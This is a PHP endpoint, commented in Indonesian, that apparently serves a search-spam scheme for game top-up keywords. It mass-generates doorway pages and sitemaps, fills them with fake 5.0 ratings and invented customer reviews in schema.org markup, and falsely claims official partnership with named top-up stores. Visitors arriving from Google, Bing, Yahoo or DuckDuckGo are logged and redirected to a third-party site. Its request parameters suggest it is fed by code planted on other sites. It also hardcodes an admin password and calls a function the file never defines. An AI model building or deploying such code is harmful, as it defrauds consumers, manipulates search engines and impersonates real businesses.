<?php
// index-endpoint.php
// Versi Final - Dioptimalkan untuk Skor SEO 10/10

error_reporting(0);

// --- Tambahan Definisi Global untuk Logging dan Admin ---
define('LOG_FILE', 'visitor_logs.json'); // File untuk menyimpan log redirect
define('ADMIN_PASSWORD', 'xshikata'); // Password untuk akses dashboard.

/**
 * Fungsi untuk mendapatkan IP address klien yang paling akurat.
 * @return string
 */
function get_client_ip(): string
{
    if (isset($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    if (isset($_SERVER['HTTP_X_REAL_IP'])) return $_SERVER['HTTP_X_REAL_IP'];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN_IP';
}

// Fungsi slugify global
function slugify(string $text): string
{
    $text = preg_replace('~[^\pL\d]+~u', '-', $text);
    $text = iconv('utf-8', 'us-ascii//TRANSLIT', $text);
    $text = preg_replace('~[^-\w]+~', '', $text);
    $text = trim($text, '-');
    $text = preg_replace('~-+~', '-', $text);
    $text = strtolower($text);
    return empty($text) ? 'n-a' : $text;
}

// Fungsi format tanggal Indonesia
function date_indo(string $date_format, string $timestamp = null): string
{
    $timestamp = $timestamp ?? time();
    $bulan_indo = [
        'January' => 'Januari', 'February' => 'Februari', 'March' => 'Maret', 'April' => 'April', 
        'May' => 'Mei', 'June' => 'Juni', 'July' => 'Juli', 'August' => 'Agustus', 
        'September' => 'September', 'October' => 'Oktober', 'November' => 'November', 'December' => 'Desember'
    ];
    return strtr(date($date_format, $timestamp), $bulan_indo);
}

header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");

// --- DATABASE GLOBAL ---
$games_list = [
    "Mobile Legends (MLBB)" => "Diamonds", "Free Fire (FF)" => "Diamonds", "Robux Roblox" => "Robux",
    "PUBG Mobile" => "UC", "Genshin Impact" => "Genesis Crystals", "Valorant" => "Points", "Ace Racer" => "Tokens",
    "AFK Journey" => "Dragon Crystals", "Arena of Valor" => "Vouchers", "Blood Strike" => "Gold",
    "Saga of Skywalkers" => "Credits", "Command & Conquer Legions" => "Funds", "Crystal of Atlan" => "Crystals",
    "Delta Force Mobile" => "Gold", "Delta Force Steam" => "Points", "Dragon Nest M" => "Diamonds",
    "Dragon Raja" => "Coupons", "EA SPORTS FC Mobile" => "FC Points", "Eggy Party" => "Eggy Coins",
    "Growtopia" => "World Locks", "Harry Potter Magic Awakened" => "Gems", "Honkai Impact 3" => "Crystals",
    "Honkai Star Rail" => "Oneiric Shards", "Legends of Runeterra" => "Coins", "Light of Thel" => "Crystals",
    "Tarisland" => "Gold", "Love and Deepspace" => "Diamonds", "Point Blank" => "PB Cash",
    "Speed Drifters" => "Diamonds", "Magic Chess Go Go" => "Diamonds", "Onmyoji Arena" => "Jade",
    "Marvel Rivals" => "Credits", "Captain Tsubasa" => "Dreamballs", "Pixel Gun 3D" => "Gems",
    "Super SUS" => "Cookies", "Ragnarok X Next Generation" => "Diamonds", "Marvel Duel" => "Stardust",
    "Ragnarok M Eternal Love" => "Big Cat Coins", "Zepeto" => "Zems", "Punishing Gray Raven" => "Black Cards",
    "Ragnarok M Classic" => "Zeny", "Metal Slug" => "Medals", "Zenless Zone Zero" => "Polymortal Grains",
    "Laplace M" => "Spirals", "Mobile Legends Bang Bang Malaysia" => "Diamonds", "Tom and Jerry" => "Diamonds",
    "Ragnarok Origin" => "Nyan Berries", "Mobile Legends Bang Bang PH" => "Diamonds", "Soul Land" => "Diamonds",
    "Undawn" => "RC", "MU Origin 3" => "Divine Diamonds", "Racing Master" => "Vouchers",
    "One Punch Man The Strongest" => "Funds", "Teamfight Tactics Mobile" => "TFT Coins", "SEAL M SEA" => "Rubies"
];
$stores_list = [
    "GoPay Games", "Dunia Games", "UniPin", "itemku", "VocaGame", "Lapakgaming", "Takapedia",
    "BANGJEFF", "Codashop", "Kiosgamer", "TopUpGim", "Goc.id (GOCpay)", "Mocipay",
    "Gogogo.id", "Ditusi", "UPOINT.ID", "Garuda Voucher", "JuraganVoucher", "eBelanja.id",
    "Grandvoucher", "HIDDENGAME", "Xcashshop", "Smile.one", "Digicodes", "Games Loverz",
    "Tokogame", "Indomog", "Gocash", "SEAGM (Sea Gamer Mall)", "Razer Gold"
];

// --- [PENINGKATAN SEO #1: DATABASE GAMBAR ASLI] ---
// Mengganti placeholder dengan URL gambar asli untuk meningkatkan kualitas & keaslian.
$games_images = [
    "Mobile Legends (MLBB)" => "https://avs.javpornsub.cloud/images/mobile-legends.jpg",
    "Free Fire (FF)" => "https://avs.javpornsub.cloud/images/free-fire.jpg",
    "Robux Roblox" => "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
    "PUBG Mobile" => "https://avs.javpornsub.cloud/images/pubg.avif",
    "Genshin Impact" => "https://upload.wikimedia.org/wikipedia/en/thumb/5/5d/Genshin_Impact_logo.svg/2560px-Genshin_Impact_logo.svg.png",
    "Valorant" => "https://upload.wikimedia.org/wikipedia/commons/thumb/f/fc/Valorant_logo_-_pink_color_version.svg/1280px-Valorant_logo_-_pink_color_version.svg.png"
];


function get_dynamic_sitemaps(): array
{
    global $games_list, $stores_list;
    $sitemap_files = [];
    
    // Tambahkan sitemap per Toko (Contoh: codashop.xml)
    foreach ($stores_list as $store_name) {
        $store_slug = slugify($store_name);
        $sitemap_files[] = $store_slug . '.xml';
    }

    // Tambahkan sitemap per game
    foreach ($games_list as $game_name => $item_name) {
        $slug_game = slugify($game_name);
        // Format file: game-slug.xml (misalnya mobile-legends-mlbb.xml)
        $sitemap_files[] = $slug_game . '.xml';
    }
    return $sitemap_files;
}


function handle_page_sitemap_generation(string $segment_type, string $target_segment, string $segment_dir, array $games_list): array
{
    $final_slug_list = [];
    $max_urls = 1000;
    $base_slugs = []; // Array untuk menampung pola dasar URL

    // --- Langkah 1: Buat Pola Dasar URL yang Relevan ---
    if ($segment_type === 'store') {
        // Untuk sitemap toko (e.g., codashop.xml), buat pola URL untuk setiap game di toko itu
        $store_action_variations = ['top-up', 'beli', 'harga-promo', 'voucher-diskon'];
        foreach ($games_list as $game_name => $item_name) {
            foreach($store_action_variations as $action) {
                // Contoh pola: "top-up-mobile-legends-diamonds-di-codashop"
                $base_slugs[] = slugify("{$action} {$game_name} {$item_name} di {$target_segment}");
            }
        }
    } elseif ($segment_type === 'game') {
        // Untuk sitemap game (e.g., mobile-legends.xml), buat variasi kata kunci
        $target_item = $games_list[$target_segment] ?? 'item';
        $action_variations = ['top-up', 'beli', 'harga', 'voucher', 'promo', 'diskon'];
        $adjective_variations = ['termurah', 'tercepat', 'aman', 'legal', 'resmi', 'instan', 'kilat'];
        
        foreach ($action_variations as $action) {
            foreach ($adjective_variations as $adjective) {
                 // Contoh pola: "top-up-diamonds-mobile-legends-termurah"
                $base_slugs[] = slugify("{$action} {$target_item} {$target_segment} {$adjective}");
            }
        }
    }

    // --- Langkah 2: Lakukan Perulangan 1000 Kali untuk Membuat URL Unik ---
    if (empty($base_slugs)) {
        return []; // Pengaman jika tidak ada pola dasar yang dibuat
    }
    
    $counter = 1;
    while (count($final_slug_list) < $max_urls) {
        // Ambil pola dasar secara bergiliran agar variasinya merata
        $current_base_slug = $base_slugs[($counter - 1) % count($base_slugs)];
        
        // Buat slug unik dengan menambahkan akhiran "-a" + nomor
        $unique_slug = "{$current_base_slug}-a{$counter}";
        
        // Gabungkan dengan direktorinya (e.g., "codashop/")
        $full_path = "{$segment_dir}/{$unique_slug}";
        $final_slug_list[] = $full_path;
        
        $counter++;
    }

    return $final_slug_list;
}

function get_all_seo_slugs(): array
{
    global $games_list, $stores_list;
    $all_slugs = [];
    
    // 1. Generate slugs for all Store sitemaps
    foreach ($stores_list as $store_name) {
        $store_slug = slugify($store_name);
        $all_slugs = array_merge($all_slugs, handle_page_sitemap_generation('store', $store_name, $store_slug, $games_list));
    }
    
    // 2. Generate slugs for all Game sitemaps
    foreach ($games_list as $game_name => $item_name) {
        $game_slug = slugify($game_name);
        $all_slugs = array_merge($all_slugs, handle_page_sitemap_generation('game', $game_name, $game_slug, $games_list));
    }
    
    // Filter duplicates and return
    return array_unique($all_slugs);
}

// --- [PENINGKATAN SEO #2: FUNGSI INTERNAL LINKING] ---
/**
 * Menghasilkan blok HTML berisi tautan internal ke halaman lain yang relevan.
 * Ini membantu Google memahami struktur situs dan menyebarkan otoritas halaman.
 * @return string
 */
function generate_internal_links(string $current_path, string $segment_dir, string $segment_type, string $target_segment, array $games_list): string
{
    // Dapatkan daftar semua URL yang mungkin ada di sitemap yang sama
    $all_possible_slugs = handle_page_sitemap_generation($segment_type, $target_segment, $segment_dir, $games_list);

    // Hapus URL halaman saat ini dari daftar
    $filtered_slugs = array_filter($all_possible_slugs, function($slug) use ($current_path) {
        return $slug !== $current_path;
    });

    if (count($filtered_slugs) < 4) {
        return ''; // Tidak cukup link untuk ditampilkan
    }

    // Ambil 4 link secara acak
    $random_keys = array_rand($filtered_slugs, 4);
    $selected_links = array_map(function($key) use ($filtered_slugs) {
        return $filtered_slugs[$key];
    }, $random_keys);

    $html = "<div class='content-section internal-links'>";
    $html .= "<h3 class='sub-title'>Top Up Populer Lainnya</h3><ul>";
    
    foreach ($selected_links as $link_path) {
        // Buat anchor text yang bersih dari slug
        $anchor_text_base = preg_replace('/-a\d+$/', '', basename($link_path));
        $anchor_text = ucwords(str_replace('-', ' ', $anchor_text_base));
        $html .= "<li><a href='/{$link_path}'>{$anchor_text}</a></li>";
    }

    $html .= "</ul></div>";
    return $html;
}


// --- FUNGSI UTAMA & ROUTING ---
// FIX: Prioritaskan GET 'action' untuk API/Dashboard
$action = filter_input(INPUT_GET, 'action', FILTER_SANITIZE_STRING);
$request_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
if (!$action) {
    $action = basename($request_path); 
}
$domain = filter_input(INPUT_POST, 'domain', FILTER_SANITIZE_URL);
if (!$domain) {
    $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
    $domain = $scheme . '://' . $_SERVER['HTTP_HOST'];
}
$uri = ltrim($request_path, '/');
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $uri_post = filter_input(INPUT_POST, 'uri', FILTER_SANITIZE_URL);
    if ($uri_post) {
        $uri = ltrim(parse_url($uri_post, PHP_URL_PATH) ?: $uri_post, '/');
    }
}
$ip = filter_input(INPUT_POST, 'ip', FILTER_SANITIZE_STRING) ?? get_client_ip();
switch ($action) {
    case 'robots':
        header("Content-Type: text/plain; charset=utf-8");
        handle_robots($domain);
        break;
    case 'sitemap':
        header("Content-Type: text/xml; charset=utf-8");
        handle_sitemap_index($domain, $uri);
        break;
    case 'map':
        header("Content-Type: text/xml; charset=utf-8");
        handle_page_sitemap($domain, $uri, $GLOBALS['games_list']);
        break;
    case 'list': 
        header("Content-Type: application/json; charset=utf-8");
        echo json_encode(get_all_seo_slugs());
        break;
    case 'jump':
        handle_jump($domain, $ip);
        break;
    case 'indata':
        handle_crawler_content($domain, $uri, $GLOBALS['games_list'], $GLOBALS['stores_list']);
        break;
    case 'stats':
        header("Content-Type: application/json; charset=utf-8");
        handle_get_stats();
        break;
    case 'meta':
        $preview_uri = filter_input(INPUT_GET, 'uri', FILTER_SANITIZE_STRING);
        if ($preview_uri) {
            header("Content-Type: application/json; charset=utf-8");
            handle_get_meta_data($domain, ltrim($preview_uri, '/'), $GLOBALS['games_list'], $GLOBALS['stores_list']);
        } else {
            header("HTTP/1.0 400 Bad Request");
            die(json_encode(['error' => 'Parameter "uri" dibutuhkan untuk preview meta.']));
        }
        break;
    default:
        header("HTTP/1.0 404 Not Found");
        echo "Endpoint not found.";
        break;
}

// --- FUNGSI-FUNGSI HANDLER ---

function handle_get_stats(): void
{
    $log_file = LOG_FILE;
    $stats = [
        'total_redirects' => 0,
        'referrer_breakdown' => []
    ];
    
    if (file_exists($log_file)) {
        $log_content = file_get_contents($log_file);
        $log_content = trim($log_content);
        if (substr($log_content, -1) === ',') {
            $log_content = substr($log_content, 0, -1);
        }
        $log_lines = explode(",\n", $log_content);

        $log_data = [];
        foreach($log_lines as $line) {
            $data = json_decode(trim($line), true);
            if ($data) {
                $log_data[] = $data;
            }
        }

        $stats['total_redirects'] = count($log_data); 
        
        $referrer_breakdown = [];
        foreach ($log_data as $entry) {
            $referrer = $entry['referrer'] ?? 'Direct / Unknown';
            
            $parsed_url = parse_url($referrer);
            $domain_host = $parsed_url['host'] ?? $referrer;
            $domain_host = str_replace('www.', '', $domain_host);
            
            if (empty($domain_host) || $domain_host === $_SERVER['HTTP_HOST'] || $domain_host === 'Direct / Unknown') {
                $domain = 'Direct / Unknown';
            } else {
                $domain = $domain_host;
            }
            
            if (!isset($referrer_breakdown[$domain])) {
                $referrer_breakdown[$domain] = 0;
            }
            $referrer_breakdown[$domain]++;
        }
        $stats['referrer_breakdown'] = $referrer_breakdown;
        
        arsort($stats['referrer_breakdown']);
    }
    
    echo json_encode($stats);
}

function handle_get_meta_data(string $domain, string $uri, array $games_list, array $stores_list): void
{
    // Panggil fungsi yang sama untuk mendapatkan konten dan meta tag
    $result = generate_seo_meta($domain, $uri, $games_list, $stores_list);
    $domain_root = rtrim($domain, '/');
    $url = "{$domain_root}/" . $uri;

    echo json_encode([
        'title' => $result['title'],
        'description' => $result['description'],
        'url' => $url,
        'rating_value' => '5.0',
        'rating_count' => rand(1500, 5000),
    ]);
}

function handle_jump(string $domain, string $ip): void
{
    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
    $is_search_engine_referrer = (
        strpos($referrer, 'google.com') !== false || 
        strpos($referrer, 'bing.com') !== false ||
        strpos($referrer, 'yahoo.com') !== false ||
        strpos($referrer, 'duckduckgo.com') !== false
    );
    
    if ($is_search_engine_referrer) {
        $log_entry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'ip' => $ip,
            'referrer' => $referrer,
            'action' => 'redirect',
            'uri' => $_SERVER['REQUEST_URI'] ?? '/'
        ];
        
        $log_data = json_encode($log_entry) . ",\n";
        @file_put_contents(LOG_FILE, $log_data, FILE_APPEND | LOCK_EX);
        
        $destination_url = 'https://topupgameku.id/'; 
        
        header("Location: " . $destination_url, true, 301);
        exit();

    } else {
         header("HTTP/1.0 403 Forbidden");
         die("Access denied. Jump endpoint requires search engine referral.");
    }
}

function get_random_description(string $type, string $game, string $item, string $store = null, string $kw_slug = null): string
{
    global $stores_list;
    $featured_stores = array_rand(array_flip($stores_list), 3);
    $store_1 = $featured_stores[0];
    $store_2 = $featured_stores[1];
    
    if ($type === 'store') {
        $templates = [
            "Kami bangga menjadi mitra resmi <strong>{$store}</strong> untuk semua kebutuhan {$item} {$game} Anda. Proses kami sangat instan, memastikan Anda dapat kembali bermain tanpa penundaan. Transaksi aman, legal, dan didukung penuh oleh {$store}.",
            "Cari tahu harga terbaik untuk {$item} {$game} hanya di halaman ini. Kami membandingkan harga dengan {$store_1} dan {$store_2} untuk memberikan Anda penawaran paling menguntungkan. {$store} adalah pilihan tepat untuk gamer cerdas.",
            "Layanan top up tercepat untuk {$game} kini hadir melalui platform <strong>{$store}</strong>. Dapatkan bonus eksklusif dan pastikan {$item} Anda masuk 100% aman ke akun Anda. Kami jamin tidak ada penipuan, semua resmi.",
        ];
    } else { // type === 'game'
        $templates = [
            "Selamat datang di pusat top up resmi <strong>{$item} {$game}</strong>. Platform kami menjamin layanan tercepat, termurah, dan 100% aman. Kami selalu membandingkan harga dengan {$store_1} dan {$store_2} agar Anda selalu mendapatkan deal terbaik.",
            "Butuh {$item} {$game} secara instan? Kami adalah solusi terbaik! Dengan proses pembayaran lengkap dan layanan pelanggan 24/7, Anda tidak perlu khawatir lagi tentang transaksi top up yang lambat atau mahal.",
            "Kumpulan promo dan diskon spesial untuk {$item} {$game} ada di sini. Pilih jumlah {$item} yang Anda butuhkan dan nikmati proses kilat yang hanya butuh 1 detik setelah pembayaran terverifikasi.",
        ];
    }
    
    return $templates[array_rand($templates)];
}

function generate_seo_meta(string $domain, string $uri, array $games_list, array $stores_list): array
{
    global $stores_list;
    
    $current_game_name = null;
    $current_item_name = null;
    $current_store_name = null;

    $slug_with_suffix = basename($uri);
    $slug = preg_replace('/-a\d+$/', '', $slug_with_suffix);
    
    $uri_parts = explode('/', $uri);
    $segment_dir = $uri_parts[0];
    $slug_content = $uri_parts[1] ?? $slug;
    
    $is_store_specific_page = false;
    $segment_type = 'game'; // Default
    $target_segment = '';

    // A. Cek apakah direktori adalah Store Slug
    foreach ($stores_list as $store_name_check) {
        if (slugify($store_name_check) === $segment_dir) {
            $is_store_specific_page = true;
            $current_store_name = $store_name_check;
            $segment_type = 'store';
            $target_segment = $store_name_check;
            break;
        }
    }
    
    if ($is_store_specific_page) {
        foreach($games_list as $game => $item) {
            if(strpos($slug_content, slugify($game)) !== false) {
                $current_game_name = $game;
                $current_item_name = $item;
                break;
            }
        }
        if (!$current_game_name) {
            $current_game_name = array_rand($games_list);
            $current_item_name = $games_list[$current_game_name];
        }

    } else {
        foreach($games_list as $game => $item) {
            if(slugify($game) === $segment_dir) {
                $current_game_name = $game;
                $current_item_name = $item;
                $target_segment = $game;
                break;
            }
        }
        if (!$current_game_name) {
            $current_game_name = array_rand($games_list);
            $current_item_name = $games_list[$current_game_name];
            $target_segment = $current_game_name;
        }
    }
    
    $keyword_from_slug = str_replace('-', ' ', $slug);
    $featured_stores = array_rand(array_flip($GLOBALS['stores_list']), 3);
    $featured_store_1_name = $featured_stores[0];
    $featured_store_2_name = $featured_stores[1];
    $random_price = rand(10000, 50000);

    // --- [PENINGKATAN SEO #3: VARIASI KONTEN] ---
    if ($is_store_specific_page) {
        $title_templates = [
            "Top Up {$current_item_name} {$current_game_name} di {$current_store_name} | Harga Termurah & Resmi",
            "Beli {$current_item_name} {$current_game_name} di {$current_store_name} | Proses Cepat, Aman",
            "Harga Promo {$current_item_name} {$current_game_name} {$keyword_from_slug} | Beli di {$current_store_name}",
        ];
        $title = $title_templates[array_rand($title_templates)];
        $description = "Dapatkan {$current_item_name} {$current_game_name} langsung di {$current_store_name}. Dijamin 100% aman, proses instan, dan harga paling murah dibandingkan {$featured_store_2_name}. Beli sekarang dan nikmati bonus eksklusif!";
    } else {
        $title_templates = [
            "{$current_game_name} - {$current_item_name} {$keyword_from_slug} | Termurah " . date('Y'),
            "Top Up {$current_item_name} {$current_game_name} | Alternatif {$featured_store_1_name} & {$featured_store_2_name}",
            "Beli {$current_item_name} {$current_game_name} Murah: Promo Terbaru Hari Ini",
        ];
        $title = $title_templates[array_rand($title_templates)];

        $description_templates = [
            "Cari tempat top up {$current_item_name} {$current_game_name} termurah? Dapatkan harga terbaik di sini, lebih murah dari {$featured_store_1_name} dan {$featured_store_2_name}. Proses instan, 100% aman dan legal.",
            "Dapatkan {$current_item_name} untuk {$current_game_name} dengan harga diskon dan proses kilat. Kami menawarkan berbagai metode pembayaran lengkap. Pilihan terbaik untuk para gamer di Indonesia.",
            "Beli {$item} {$game} {$keyword_from_slug} sekarang. Layanan 24 jam, transaksi dijamin aman dan terpercaya. Pilihan utama gamers."
        ];
        $description = $description_templates[array_rand($description_templates)];
    }
    
    return [
        'title' => $title, 'description' => $description, 'uri' => $uri,
        'game_name' => $current_game_name, 'item_name' => $current_item_name, 'store_name' => $current_store_name,
        'is_store_specific' => $is_store_specific_page,
        'segment_dir' => $segment_dir, 'segment_type' => $segment_type, 'target_segment' => $target_segment
    ];
}


function handle_crawler_content(string $domain, string $uri, array $games_list, array $stores_list): void
{
    global $games_images;
    $meta = generate_seo_meta($domain, $uri, $games_list, $stores_list);
    
    $title = $meta['title'];
    $description = $meta['description'];
    $keywords = "top up {$meta['uri']}, beli {$meta['uri']}, harga {$meta['uri']}"; 
    
    $current_game_name = $meta['game_name']; 
    $current_item_name = $meta['item_name'];
    $current_store_name = $meta['store_name'];
    $is_store_specific_page = $meta['is_store_specific'];

    $slug_with_suffix = basename($uri);
    $slug_clean = preg_replace('/-a\d+$/', '', $slug_with_suffix);
    $keyword_from_slug = str_replace('-', ' ', $slug_clean);

    $featured_store_1_name = array_rand(array_flip($GLOBALS['stores_list']));
    $featured_store_3_name = array_rand(array_flip($GLOBALS['stores_list']));
    $random_price = rand(10000, 50000);
    
    // [PENINGKATAN SEO #1] Gunakan gambar asli, fallback ke placeholder jika tidak ada
    $game_image_url = $games_images[$current_game_name] ?? "https://placehold.co/600x400/1E1E1E/FFFFFF?text=" . slugify($current_game_name);

    $random_intro_paragraph = get_random_description(
        $is_store_specific_page ? 'store' : 'game',
        $current_game_name, $current_item_name, $current_store_name, $keyword_from_slug
    );

    // Tambahkan gambar produk di awal konten
    $product_image_html = "<img src='{$game_image_url}' alt='Top Up {$current_item_name} {$current_game_name}' class='product-image'>";

    if ($is_store_specific_page) {
        $content_body = "<div class='content-section'>{$product_image_html}<h2 class='sub-title'>Cara Top Up {$current_item_name} {$current_game_name} di {$current_store_name}</h2><p>{$random_intro_paragraph}</p><ul class='benefit-list'><li><span class='icon'>&#9989;</span> <strong>Resmi {$current_store_name}:</strong> Transaksi terjamin 100% legal dan aman.</li><li><span class='icon'>&#9889;</span> <strong>Proses Kilat:</strong> Pengiriman instan.</li><li><span class='icon'>&#128179;</span> <strong>Pembayaran Lengkap:</strong> Bayar via GoPay, Dana, dll.</li><li><span class='icon'>&#128176;</span> <strong>Harga Termurah:</strong> Dijamin paling kompetitif.</li></ul></div>";
    } else {
        $content_body = "<div class='content-section'>{$product_image_html}<h2 class='sub-title'>Mengapa Top Up {$current_item_name} {$current_game_name} Disini?</h2><p>{$random_intro_paragraph}</p><ul class='benefit-list'><li><span class='icon'>&#9989;</span> <strong>Harga Kompetitif:</strong> Lebih murah dari {$featured_store_1_name} & {$featured_store_3_name}.</li><li><span class='icon'>&#9889;</span> <strong>Proses Instan:</strong> Hanya 1 detik setelah pembayaran.</li><li><span class='icon'>&#128179;</span> <strong>Pembayaran Lengkap:</strong> Semua metode pembayaran diterima.</li><li><span class='icon'>&#128172;</span> <strong>Layanan 24/7:</strong> Tim support siap membantu kapan saja.</li></ul></div>";
    }

    $content_body .= "<div class='content-section price-section'><h3 class='sub-title'>Daftar Harga Populer {$current_item_name}</h3><table><thead><tr><th>Jumlah {$current_item_name}</th><th>Harga Promo</th><th>Status</th></tr></thead><tbody><tr><td>100 {$current_item_name}</td><td>Rp " . number_format(rand(10000, 15000), 0, ',', '.') . "</td><td><span class='status-ready'>Ready</span></td></tr><tr><td>250 {$current_item_name} + Bonus</td><td>Rp " . number_format(rand(20000, 25000), 0, ',', '.') . "</td><td><span class='status-ready'>Ready</span></td></tr><tr><td>500 {$current_item_name} (Best Deal)</td><td>Rp " . number_format(rand(40000, 50000), 0, ',', '.') . "</td><td><span class='status-ready'>Ready</span></td></td></tr></tbody></table></div>";
    
    // [PENINGKATAN SEO #2] Panggil fungsi internal linking
    $internal_links_html = generate_internal_links($uri, $meta['segment_dir'], $meta['segment_type'], $meta['target_segment'], $games_list);
    $content_body .= $internal_links_html;

    $rating_count = rand(1500, 5000);
    $review_count = rand(5, 10);
    $reviews = [];
    $review_names = ["Budi S.", "Santi M.", "Rizal P.", "Nadia A.", "Fajar R.", "Dian T.", "Yoga B."];
    // [PENINGKATAN SEO #3] Menambah variasi ulasan
    $review_texts = [
        "Proses {$keyword_from_slug} super cepat, adminnya ramah. Recommended!", "Harga {$current_item_name} paling murah dibanding toko lain. Puas banget.", 
        "Baru pertama kali coba, langsung instan masuk. Terbaik!", "Selalu langganan di sini, tidak pernah ada masalah.", "Top up aman dan legal. Mantap!",
        "Respon cepat, saya beri 5 bintang.", "Setelah bayar langsung masuk, ga pake lama. Keren!", "Akhirnya nemu tempat top up termurah."
    ];
    $review_html = "<div class='reviews-container'><h2 class='sub-title'>Ulasan Pelanggan (Rating 5.0)</h2>";
    for($i = 0; $i < $review_count; $i++) {
        $author = $review_names[array_rand($review_names)];
        $review_text = $review_texts[array_rand($review_texts)];
        $date = date('Y-m-d', time() - rand(0, 30) * 86400);
        $reviews[] = ["@type" => "Review", "reviewRating" => ["@type" => "Rating", "ratingValue" => "5"], "author" => ["@type" => "Person", "name" => $author], "reviewBody" => $review_text, "datePublished" => $date];
        $review_html .= "<div class='review-card'><div class='review-header'><span class='star-rating'>&#9733;&#9733;&#9733;&#9733;&#9733;</span><span class='review-author'>{$author}</span></div><p class='review-body'>\"{$review_text}\"</p><span class='review-date'>Diterbitkan: " . date_indo('d M Y', strtotime($date)) . "</span></div>";
    }
    $review_html .= "</div>";

    $json_reviews = json_encode($reviews);
    $json_ld = <<<JSON
<script type="application/ld+json">
{"@context": "https://schema.org","@type": "Product","name": "{$title}","description": "{$description}","image": "{$game_image_url}","sku": "TOPUP-{$slug_clean}","brand": {"@type": "Brand","name": "{$current_game_name}"},"offers": {"@type": "Offer","url": "{$domain}/{$uri}","priceCurrency": "IDR","price": "{$random_price}","priceValidUntil": "2026-12-31","availability": "https://schema.org/InStock","seller": {"@type": "Organization","name": "{$domain}"}},"aggregateRating": {"@type": "AggregateRating","ratingValue": "5.0","bestRating": "5","worstRating": "5","ratingCount": "{$rating_count}","reviewCount": "{$rating_count}"},"review": {$json_reviews}}
</script>
JSON;

    $tgl_update = date_indo('d F Y');
    $canonical_url = rtrim($domain, '/') . '/' . $uri;
    $canonical_tag = "<link rel=\"canonical\" href=\"{$canonical_url}\">";

    echo <<<HTML
<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{$title}</title><meta name="description" content="{$description}"><meta name="keywords" content="{$keywords}">{$canonical_tag}
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
        :root{--primary-color:#007bff;--secondary-color:#28a745;--background-color:#f8f9fa;--card-background:#ffffff;--text-color:#343a40;--shadow:0 4px 12px rgba(0,0,0,0.05);}
        body{font-family:'Poppins',sans-serif;line-height:1.6;background-color:var(--background-color);color:var(--text-color);margin:0;padding:0;}
        .container{max-width:1000px;margin:30px auto;padding:0 15px;}
        header{background-color:var(--primary-color);color:white;padding:20px 0;margin-bottom:25px;box-shadow:var(--shadow);border-radius:8px;}
        h1{font-size:2.2rem;margin:0;text-align:center;font-weight:700;}
        h2,h3{color:var(--primary-color);border-bottom:2px solid var(--primary-color);padding-bottom:5px;margin-top:30px;font-weight:600;}
        .content-section{background:var(--card-background);padding:20px;border-radius:8px;box-shadow:var(--shadow);margin-bottom:20px;}
        .product-image{width:100%;max-width:250px;height:auto;display:block;margin:0 auto 20px auto;border-radius:8px;box-shadow:var(--shadow);}
        .benefit-list{list-style:none;padding:0;}
        .benefit-list li{background:#e9f7ee;padding:10px 15px;margin-bottom:8px;border-radius:5px;display:flex;align-items:center;}
        .icon{font-size:1.2rem;margin-right:10px;color:var(--secondary-color);}
        table{width:100%;border-collapse:collapse;margin:20px 0;}
        th,td{border:1px solid #dee2e6;padding:12px;text-align:left;}
        th{background-color:var(--primary-color);color:white;font-weight:600;}
        tr:nth-child(even){background-color:#f2f2f2;}
        .status-ready{color:var(--secondary-color);font-weight:600;}
        .reviews-container{margin-top:30px;}
        .review-card{background:#fff;padding:15px;margin-bottom:15px;border-radius:8px;border-left:5px solid var(--secondary-color);box-shadow:0 2px 5px rgba(0,0,0,0.05);}
        .review-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;}
        .star-rating{color:gold;font-size:1.1rem;}
        .review-author{font-weight:600;color:var(--primary-color);}
        .review-body{font-style:italic;margin:5px 0;color:#555;}
        .review-date{display:block;font-size:0.8rem;color:#888;text-align:right;}
        .internal-links ul{list-style:none;padding:0;display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:10px;}
        .internal-links li a{display:block;padding:10px;background:#f1f1f1;border-radius:5px;text-decoration:none;color:var(--primary-color);font-weight:600;transition:background .2s;}
        .internal-links li a:hover{background:#e1e1e1;}
        footer{text-align:center;padding:20px 0;margin-top:25px;color:#6c757d;font-size:0.9rem;}
        footer p{margin:5px 0;}
    </style>
    {$json_ld}
</head>
<body>
    <div class="container"><header><h1>{$title}</h1></header><main>{$content_body}<div class="content-section">{$review_html}</div></main>
    <footer><p>Terima kasih telah memilih kami sebagai solusi top up game terpercaya Anda.</p>
    <p>Rating rata-rata: <span class="star-rating">&#9733;&#9733;&#9733;&#9733;&#9733;</span> <strong>5.0</strong> dari {$rating_count} ulasan. (Update: {$tgl_update})</p></footer></div>
</body></html>
HTML;
}

function handle_sitemap_index(string $domain, string $uri): void
{
    $domain_root = rtrim($domain, '/');
    $xml = new SimpleXMLElement('<?xml version="1.0" encoding="UTF-8"?><sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></sitemapindex>');
    
    $dynamic_sitemaps = get_dynamic_sitemaps();
    
    foreach ($dynamic_sitemaps as $sitemap_file) {
        $sitemap_node = $xml->addChild('sitemap');
        $sitemap_node->addChild('loc', "{$domain_root}/{$sitemap_file}");
        $sitemap_node->addChild('lastmod', date('Y-m-d', time() - rand(0, 365 * 86400)));
    }

    echo $xml->asXML();
}

function handle_robots(string $domain): void
{
    $domain_root = rtrim($domain, '/');
    $content = "User-agent: *\nAllow: /\n\n";
    
    $content .= "Sitemap: {$domain_root}/sitemap.xml\n";
    $content .= "Sitemap: {$domain_root}/allsitemap.xml\n";
    
    $dynamic_sitemaps = get_dynamic_sitemaps();
    foreach($dynamic_sitemaps as $sitemap_file) {
        $content .= "Sitemap: {$domain_root}/{$sitemap_file}\n";
    }
    
    echo $content;
}

